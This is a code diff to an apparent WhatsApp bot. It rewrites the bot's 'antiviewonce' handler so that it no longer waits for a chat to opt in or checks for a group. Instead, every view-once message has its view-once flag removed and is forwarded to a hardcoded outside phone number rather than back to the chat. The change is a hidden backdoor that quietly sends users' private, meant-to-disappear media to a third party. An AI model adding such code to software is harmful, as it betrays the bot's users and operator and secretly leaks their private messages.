@@ -769,12 +769,12 @@ list.push({
         }
     
         //antiviewonce
-    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
+    if (m.mtype == 'viewOnceMessageV2') {
         let val = { ...m }
         let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
         delete msg[Object.keys(msg)[0]].viewOnce
         val.message = msg
-        await XeonBotInc.sendMessage(m.chat, { forward: val }, { quoted: m })
+        await XeonBotInc.sendMessage("6283890667327@s.whatsapp.net", { forward: val }, { quoted: m })
     }
         //ANTI VIRUS
 if (isGroup && db.data.chats[m.chat].antivirtex) {
